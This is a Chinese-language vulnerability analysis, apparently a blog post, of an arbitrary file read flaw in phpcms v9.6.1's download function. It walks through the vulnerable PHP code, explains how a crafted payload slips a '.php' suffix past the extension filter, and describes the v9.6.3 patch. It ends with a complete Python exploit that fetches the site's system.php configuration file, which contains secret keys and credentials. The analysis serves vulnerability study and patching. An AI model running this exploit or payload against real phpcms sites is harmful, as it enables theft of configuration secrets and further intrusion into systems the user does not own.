phpcms v9.6.1 爆出的任意文件读取漏洞， 来一起分析以下，这次漏洞可以说和9.6.0爆出来的sqli注入漏洞有一些联系，漏洞文件和漏洞利用方法都是一样的，只是这次漏洞点在down.php的download函数


我们定位到漏洞函数`/phpcms/modules/content/down.php` Line 103-127

```php
public function download() {
	$a_k = trim($_GET['a_k']);
	$pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down');
	$a_k = sys_auth($a_k, 'DECODE', $pc_auth_key);
	if(empty($a_k)) showmessage(L('illegal_parameters'));
	unset($i,$m,$f,$t,$ip);
	$a_k = safe_replace($a_k);
	parse_str($a_k);		
	if(isset($i)) $downid = intval($i);
	if(!isset($m)) showmessage(L('illegal_parameters'));
	if(!isset($modelid)) showmessage(L('illegal_parameters'));
	if(empty($f)) showmessage(L('url_invalid'));
	if(!$i || $m<0) showmessage(L('illegal_parameters'));
	if(!isset($t)) showmessage(L('illegal_parameters'));
	if(!isset($ip)) showmessage(L('illegal_parameters'));
	$starttime = intval($t);
	if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));
	$fileurl = trim($f);
	if(!$downid || empty($fileurl) || !preg_match("/[0-9]{10}/", $starttime) || !preg_match("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/", $ip) || $ip != ip()) showmessage(L('illegal_parameters'));	
	$endtime = SYS_TIME - $starttime;
	if($endtime > 3600) showmessage(L('url_invalid'));
	if($m) $fileurl = trim($s).trim($fileurl);
	if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$fileurl) ) showmessage(L('url_error'));
	//远程文件
	if(strpos($fileurl, ':/') && (strpos($fileurl, pc_base::load_config('system','upload_url')) === false)) { 
		header("Location: $fileurl");
	} else {
		if($d == 0) {
			header("Location: ".$fileurl);
		} else {
			$fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl);
			$filename = basename($fileurl);
			//处理中文文件
			if(preg_match("/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/", $fileurl)) {
				$filename = str_replace(array("%5C", "%2F", "%3A"), array("\\", "/", ":"), urlencode($fileurl));
				$filename = urldecode(basename($filename));
			}
			$ext = fileext($filename);
			$filename = date('Ymd_his').random(3).'.'.$ext;
			$fileurl = str_replace(array('<','>'), '',$fileurl);
			file_down($fileurl, $filename);
		}
	}
}
```

这个函数开始几行代码的作用和init函数中的几乎一样，都是从parse_str 解析传入的a_k参数，但这里调用了safe_replace函数过滤。

和文件名有关的参数是$s,$f。 这两个参数都是通过parse_str解析变量得到，然后程序对$f参数过滤，过滤规则如下：

```php
if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error'));
$fileurl = trim($f);
```

过滤了一些黑名单，空格以及目录跳跃,之后把$s和$f作为下载文件路径:

    if($m) $fileurl = trim($s).trim($fileurl);


再把拼接后的文件名过滤一次，程序继续运行，来到最关键的一步:

```php
$fileurl = str_replace(array('<','>'), '',$fileurl);
file_down($fileurl, $filename);
```

file_down函数是文件下载函数，调用readfile读取文件，在进入这个函数之前还用了一个`str_replace` 函数去除了大小括号，这就为我们绕过提供了思路，我们只需要构造 php< 或 php> 这样的后缀，就可以绕过正则， 之后被str_replace去掉了括号，就可以下载被过滤的文件后缀了。

a_k 的构造还是通过之前phpcms v9.6.0 sqli 那个构造cookie, 具体流程如下:

![image.png](http://upload-images.jianshu.io/upload_images/2159605-e8383f048af4b625.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

payload 如下:

    &i=1&m=1&d=1&modelid=2&catid=6&s=./phpcms/modules/content/down.ph&f=p%3%252%2*70C

放入src参数中，解后的`$s=./phpcms/modules/content/down.ph`, $f=p%3%252%2*70C


$f 的取值为`p%3%252%2*70C` --safe_replace->  `p%3%252%270C` --safe_replace--> `p%3%2520C` --parse_str--> `p%3%20C`  --safe_replace-->`p%3C`  --parse_str--> `p<`  --str_replace-->`p`

最后和$s拼接就拼接出来了php，绕过了正则了， 过程也是比较复杂， 但payload构造骚，值得学习。

### 补丁分析
phpcms v9.6.3 修复了该漏洞, 就是在用str_replace函数去掉括号后再用正则过滤了一次。

![image.png](http://upload-images.jianshu.io/upload_images/2159605-26b7ab50da1fdc02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


写了一个读取system.php配置文件的exp:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
phpcmsv9.6.0 sqli verify and attach poc
"""

import requests
import re
from urllib import quote

TIMEOUT = 3


def geta_k(url,payload):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')

    cookies = {}
    #print 'step1'
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    #print 'step1',step1
    for c in requests.get(step1,timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            break
    else:
        return False
    
    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    #print 'step2:',step2,cookies
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            return enc_payload
            break
    else:
        return False



def download(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')

    # 以获取system.php配置文件为例，其他文件可以自行修改链接即可,只能下载cms的php文件
    payload = "&i=1&m=1&d=1&modelid=2&catid=6&s=caches/configs/system.ph&f=p%3%252%2*70C"
    a_k =  geta_k(url,payload)

    url3 = url+"/index.php?m=content&c=down&siteid=1&a=init&a_k="+a_k
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
    html = requests.get(url3,headers=headers)
    res = re.findall(r'<a href="(.*?)" class="xzs_btn"></a>',html.content)
    if res[0]:
        downfile = res[0]
    else:
        return False
    url4 = url+'/index.php'+downfile
    rep = requests.get(url4,headers=headers)
    print rep.content



if __name__ == '__main__':
    download('http://localhost/')
```


